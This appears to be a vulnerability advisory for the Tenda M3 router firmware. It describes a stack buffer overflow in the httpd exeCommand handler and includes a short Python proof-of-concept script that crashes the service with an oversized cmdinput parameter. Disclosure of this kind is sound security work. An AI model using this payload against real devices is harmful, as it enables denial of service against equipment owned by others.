# Tenda M3 contains Stack buffer Overflow Vulnerability

## overview

- type: stack buffer overflow vulnerability

- supplier: Tenda https://www.tenda.com 

- product: TendaM3 https://www.tenda.com.cn/product/M3.html

- firmware download:   https://www.tenda.com.cn/download/detail-3133.html

- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a stack buffer overflow. The vunlerability is in fucntion `formexeCommand` 

![image-20220818231337695](readme.assets/image-20220818231337695.png)

In this function, is copies POST parameter `cmdinput` to stack buffer without checking its length, causing a stack buffer overflow vulnerability. 

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service)

```python
import requests

data = {
    "cmdinput": "a"*0x400
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/exeCommand", data=data, cookies=cookies)
print(res.content)
```

![image-20220818232005637](readme.assets/image-20220818232005637.png)

